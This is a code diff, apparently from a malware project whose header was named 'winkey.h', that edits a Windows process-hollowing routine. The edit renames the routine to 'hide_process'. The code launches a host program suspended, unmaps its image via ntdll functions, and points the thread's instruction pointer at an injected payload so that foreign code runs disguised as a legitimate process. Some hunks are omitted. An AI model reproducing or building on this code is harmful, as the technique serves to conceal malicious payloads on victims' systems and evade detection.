@@ -1,8 +1,6 @@
-#include "winkey.h"
+#include "hide_process.h"
 
-
-
-BOOL hollow_process(LPCWSTR hostPath, LPVOID payload, DWORD payloadSize)
+BOOL hide_process(LPCWSTR hostPath, LPVOID payload, DWORD payloadSize)
 {
 	STARTUPINFOW si = {0};
 	PROCESS_INFORMATION pi = {0};
@@ -10,7 +8,6 @@ BOOL hollow_process(LPCWSTR hostPath, LPVOID payload, DWORD payloadSize)
 
 	if (!CreateProcessW(hostPath, NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi))
 		return FALSE;
-
 	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
 	if (!hNtdll)
 		goto cleanup;
@@ -20,7 +17,6 @@ BOOL hollow_process(LPCWSTR hostPath, LPVOID payload, DWORD payloadSize)
 		(PFN_NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
 	if (!NtQueryInformationProcess || !NtUnmapViewOfSection)
 		goto cleanup;
-
 	PROCESS_BASIC_INFORMATION pbi;
 	ULONG retLen = 0;
 	if (NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen) != 0)
@@ -56,12 +52,10 @@ BOOL hollow_process(LPCWSTR hostPath, LPVOID payload, DWORD payloadSize)
 	if (!GetThreadContext(pi.hThread, &ctx))
 		goto cleanup;
 #ifdef _M_X64
-	// 10. Mettre RIP sur le nouvel entrypoint
 	ctx.Rip = (DWORD64)((BYTE*)remoteBase + nt->OptionalHeader.AddressOfEntryPoint);
 #else
 	ctx.Eax = (DWORD)((BYTE*)remoteBase + nt->OptionalHeader.AddressOfEntryPoint);
 #endif
-
 	if (!SetThreadContext(pi.hThread, &ctx))
 		goto cleanup;
 	ResumeThread(pi.hThread);
